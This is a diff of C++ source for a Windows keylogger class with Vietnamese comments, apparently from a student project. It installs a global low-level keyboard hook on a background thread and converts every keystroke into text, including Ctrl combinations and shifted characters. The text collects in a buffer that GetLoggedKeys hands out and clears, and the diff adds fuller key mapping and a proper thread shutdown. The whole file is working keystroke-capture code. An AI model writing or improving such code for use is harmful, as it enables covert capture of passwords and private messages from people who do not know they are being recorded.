@@ -1,136 +1,199 @@
-#include "Keylogger.h"
+﻿#include "Keylogger.h"
 #include <iostream>
 
-// Con tro toan cuc de ham tinh KeyboardProc co the goi ve class
 Keylogger* g_KeyloggerInstance = nullptr;
 
-Keylogger::Keylogger() : _isRunning(false), _hook(NULL) {
+// Constructor: Khởi tạo các trạng thái ban đầu
+Keylogger::Keylogger() : _isRunning(false), _hook(NULL), _threadId(0) {
     g_KeyloggerInstance = this;
 }
 
+// Destructor: Đảm bảo dừng thread và gỡ hook khi hủy đối tượng
 Keylogger::~Keylogger() {
     StopKeyLogging();
     g_KeyloggerInstance = nullptr;
 }
 
-// ==========================================
-// LOGIC HOOK CUA WINDOWS (STATIC)
-// ==========================================
+// --- HÀM CALLBACK (CỬA NGÕ NHẬN TÍN HIỆU TỪ WINDOWS) ---
 LRESULT CALLBACK Keylogger::KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
-    // Neu co su kien phim nhan (WM_KEYDOWN)
+    // Chỉ xử lý khi có sự kiện nhấn phím (WM_KEYDOWN)
     if (nCode >= 0 && wParam == WM_KEYDOWN) {
         KBDLLHOOKSTRUCT* pKey = (KBDLLHOOKSTRUCT*)lParam;
 
-        // Goi ve instance de xu ly phim va luu vao buffer
         if (g_KeyloggerInstance) {
             g_KeyloggerInstance->ProcessKey(pKey->vkCode);
         }
     }
-    // Chuyen tiep su kien cho cac ung dung khac (de khong bi liet phim)
+    // BẮT BUỘC: Chuyển tiếp sự kiện cho ứng dụng khác xử lý (để không bị liệt phím)
     return CallNextHookEx(NULL, nCode, wParam, lParam);
 }
 
-// ==========================================
-// XU LY MA PHIM (HELPER)
-// ==========================================
+// --- HÀM XỬ LÝ LOGIC CHÍNH: DỊCH MÃ PHÍM SANG TEXT ---
+// [ProcessKey] Xu ly logic chinh: Chuyen doi ma phim (VK Code) sang ky tu van ban
 void Keylogger::ProcessKey(DWORD vkCode) {
-    std::string keyName;
+    std::string keyName = "";
 
-    // Xu ly cac phim dac biet cho de doc
-    if (vkCode == VK_RETURN) keyName = "\n";
-    else if (vkCode == VK_BACK) keyName = "[BACK]";
-    else if (vkCode == VK_SPACE) keyName = " ";
-    else if (vkCode == VK_TAB) keyName = "[TAB]";
-    else if (vkCode == VK_SHIFT || vkCode == VK_LSHIFT || vkCode == VK_RSHIFT) keyName = ""; // Bo qua shift don le
-    else if (vkCode == VK_CONTROL || vkCode == VK_LCONTROL || vkCode == VK_RCONTROL) keyName = "[CTRL]";
-    else if (vkCode == VK_MENU || vkCode == VK_LMENU || vkCode == VK_RMENU) keyName = "[ALT]";
-    else if (vkCode == VK_CAPITAL) keyName = "[CAPS]";
-    else if (vkCode == VK_ESCAPE) keyName = "[ESC]";
-    else {
-        // Voi cac phim ky tu thuong (A-Z, 0-9)
-        char key = MapVirtualKeyA(vkCode, MAPVK_VK_TO_CHAR);
-        if (key != 0) {
-            keyName = std::string(1, key);
+    switch (vkCode) {
+        // --- 1. NHÓM PHÍM MODIFIERS (QUAN TRỌNG ĐỂ BẮT NÚT CTRL) ---
+        // Phải giữ các dòng case này thì mới bắt được khi nhấn nút Ctrl đơn lẻ
+    case VK_LCONTROL:
+    case VK_RCONTROL:
+    case VK_CONTROL:    keyName = "[CTRL]"; break;
+
+    case VK_LSHIFT:
+    case VK_RSHIFT:
+    case VK_SHIFT:      keyName = "[SHIFT]"; break;
+
+    case VK_LMENU:
+    case VK_RMENU:
+    case VK_MENU:       keyName = "[ALT]"; break;
+
+    case VK_CAPITAL:    keyName = "[CAPSLOCK]"; break;
+    case VK_LWIN:       keyName = "[LWIN]"; break;
+    case VK_RWIN:       keyName = "[RWIN]"; break;
+    case VK_APPS:       keyName = "[MENU_APP]"; break;
+
+        // --- 2. CÁC PHÍM CHỨC NĂNG KHÁC ---
+    case VK_BACK:       keyName = "[BACK]"; break;
+    case VK_TAB:        keyName = "[TAB]"; break;
+    case VK_RETURN:     keyName = "\n"; break;
+    case VK_SPACE:      keyName = " "; break;
+    case VK_ESCAPE:     keyName = "[ESC]"; break;
+    case VK_DELETE:     keyName = "[DEL]"; break;
+    case VK_INSERT:     keyName = "[INS]"; break;
+    case VK_HOME:       keyName = "[HOME]"; break;
+    case VK_END:        keyName = "[END]"; break;
+    case VK_PRIOR:      keyName = "[PAGE UP]"; break;
+    case VK_NEXT:       keyName = "[PAGE DOWN]"; break;
+    case VK_LEFT:       keyName = "[LEFT]"; break;
+    case VK_UP:         keyName = "[UP]"; break;
+    case VK_RIGHT:      keyName = "[RIGHT]"; break;
+    case VK_DOWN:       keyName = "[DOWN]"; break;
+    case VK_SNAPSHOT:   keyName = "[PRINTSCREEN]"; break;
+    case VK_SCROLL:     keyName = "[SCROLL LOCK]"; break;
+    case VK_PAUSE:      keyName = "[PAUSE]"; break;
+
+        // --- 3. NUMPAD & MEDIA ---
+    case VK_NUMLOCK:    keyName = "[NUM LOCK]"; break;
+    case VK_NUMPAD0:    keyName = "0"; break;
+    case VK_NUMPAD1:    keyName = "1"; break;
+    case VK_NUMPAD2:    keyName = "2"; break;
+    case VK_NUMPAD3:    keyName = "3"; break;
+    case VK_NUMPAD4:    keyName = "4"; break;
+    case VK_NUMPAD5:    keyName = "5"; break;
+    case VK_NUMPAD6:    keyName = "6"; break;
+    case VK_NUMPAD7:    keyName = "7"; break;
+    case VK_NUMPAD8:    keyName = "8"; break;
+    case VK_NUMPAD9:    keyName = "9"; break;
+    case VK_MULTIPLY:   keyName = "*"; break;
+    case VK_ADD:        keyName = "+"; break;
+    case VK_SEPARATOR:  keyName = "|"; break;
+    case VK_SUBTRACT:   keyName = "-"; break;
+    case VK_DECIMAL:    keyName = "."; break;
+    case VK_DIVIDE:     keyName = "/"; break;
+
+    case VK_VOLUME_MUTE:        keyName = "[MUTE]"; break;
+    case VK_VOLUME_DOWN:        keyName = "[VOL-]"; break;
+    case VK_VOLUME_UP:          keyName = "[VOL+]"; break;
+    case VK_MEDIA_NEXT_TRACK:   keyName = "[NEXT]"; break;
+    case VK_MEDIA_PREV_TRACK:   keyName = "[PREV]"; break;
+    case VK_MEDIA_STOP:         keyName = "[STOP]"; break;
+    case VK_MEDIA_PLAY_PAUSE:   keyName = "[PLAY/PAUSE]"; break;
+
+    case 0xFF:
+    case 0x00:
+        return;
+
+        // --- 4. XỬ LÝ KÝ TỰ VĂN BẢN VÀ TỔ HỢP PHÍM ---
+    default:
+        // Xử lý dãy phím F1 -> F24
+        if (vkCode >= VK_F1 && vkCode <= VK_F24) {
+            keyName = "[F" + std::to_string(vkCode - VK_F1 + 1) + "]";
         }
         else {
-            // Cac phim la khac
-            keyName = "[" + std::to_string(vkCode) + "]";
+            // Check xem có đang giữ Ctrl không (để bắt tổ hợp Ctrl+C, Ctrl+V...)
+            // 0x8000 là bit kiểm tra phím đang được nhấn xuống
+            bool isCtrlHeld = (GetKeyState(VK_CONTROL) & 0x8000) != 0;
+
+            // Nếu đang giữ Ctrl VÀ phím nhấn là chữ/số -> In ra [CTRL+X]
+            if (isCtrlHeld && ((vkCode >= 'A' && vkCode <= 'Z') || (vkCode >= '0' && vkCode <= '9'))) {
+                keyName = "[CTRL+" + std::string(1, (char)vkCode) + "]";
+            }
+            // Nếu không giữ Ctrl -> Xử lý văn bản bình thường (có Shift/Caps)
+            else {
+                BYTE keyboardState[256];
+                GetKeyboardState(keyboardState);
+
+                // Cập nhật trạng thái Shift/Caps từ phần cứng
+                if (GetKeyState(VK_SHIFT) & 0x8000) keyboardState[VK_SHIFT] = 0x80;
+                else keyboardState[VK_SHIFT] = 0;
+
+                if (GetKeyState(VK_CAPITAL) & 0x0001) keyboardState[VK_CAPITAL] = 0x01;
+                else keyboardState[VK_CAPITAL] = 0;
+
+                WORD asciiChar;
+                int len = ToAscii(vkCode, MapVirtualKey(vkCode, MAPVK_VK_TO_VSC), keyboardState, &asciiChar, 0);
+
+                if (len == 1) {
+                    keyName = std::string(1, (char)asciiChar);
+                }
+            }
         }
+        break;
     }
 
     if (!keyName.empty()) {
-        // KHOA MUTEX DE GHI FILE AN TOAN
         std::lock_guard<std::mutex> lock(_mutex);
         _logBuffer += keyName;
     }
 }
 
-// ==========================================
-// VONG LAP CHAY NGAM (THREAD)
-// ==========================================
+// --- VÒNG LẶP CỦA THREAD ---
 void Keylogger::RunHookLoop() {
-    // Cai dat Hook ban phim muc thap (Low Level Keyboard Hook)
+    _threadId = GetCurrentThreadId();
+
+    // Cài đặt Hook bàn phím cấp thấp 
     _hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
+    if (!_hook) return;
 
-    if (!_hook) {
-        // Neu loi cai hook
-        return;
-    }
-
-    // Message Loop: Bat buoc phai co de Hook hoat dong
     MSG msg;
-    while (_isRunning && GetMessage(&msg, NULL, 0, 0)) {
+    while (GetMessage(&msg, NULL, 0, 0)) {
+        if (msg.message == WM_QUIT) break;
         TranslateMessage(&msg);
         DispatchMessage(&msg);
     }
 
-    // Go Hook khi vong lap ket thuc
     UnhookWindowsHookEx(_hook);
     _hook = NULL;
+    _threadId = 0;
 }
 
-// ==========================================
-// CAC HAM PUBLIC
-// ==========================================
-
+// --- HÀM BẮT ĐẦU ---
 void Keylogger::StartKeyLogging() {
-    if (_isRunning) return; // Dang chay roi thi thoi
-
+    if (_isRunning) return;
     _isRunning = true;
     _logBuffer = "";
-
-    // Tao luong moi de chay ham RunHookLoop
-    // (Neu khong tao luong, ham GetMessage se lam treo chuong trinh chinh)
+    // Tạo thread riêng biệt để chạy Keylogger (không làm treo giao diện chính)
     _loggerThread = std::thread(&Keylogger::RunHookLoop, this);
 }
 
+// --- HÀM KẾT THÚC ---
 void Keylogger::StopKeyLogging() {
     if (!_isRunning) return;
-
     _isRunning = false;
-
-    // Gui mot message ao de danh thuc GetMessage va thoat vong lap
-    // (PostThreadMessage can ThreadID, o day lam don gian ta ep Hook tu go)
+    if (_threadId != 0) {
+        PostThreadMessage(_threadId, WM_QUIT, 0, 0);
+    }
     if (_loggerThread.joinable()) {
-        // Cach huy message loop don gian nhat la go hook va cho thread ket thuc
-        // Tuy nhien trong thuc te thread dang bi block o GetMessage.
-        // De demo don gian, ta detach hoac dung PostThreadMessage neu can ky hon.
-        // O muc do do an, ta co the Detach de thread tu huy khi process tat.
-        _loggerThread.detach();
+        _loggerThread.join();
     }
 }
 
+// --- HÀM LẤY DỮ LIỆU ---
 std::string Keylogger::GetLoggedKeys() {
-    // KHOA MUTEX DE DOC DU LIEU
     std::lock_guard<std::mutex> lock(_mutex);
-
     if (_logBuffer.empty()) return "";
-
-    // Copy du lieu ra
     std::string data = _logBuffer;
-
-    // Xoa buffer cu (de lan sau khong gui lai cai cu nua)
     _logBuffer.clear();
-
     return data;
 }
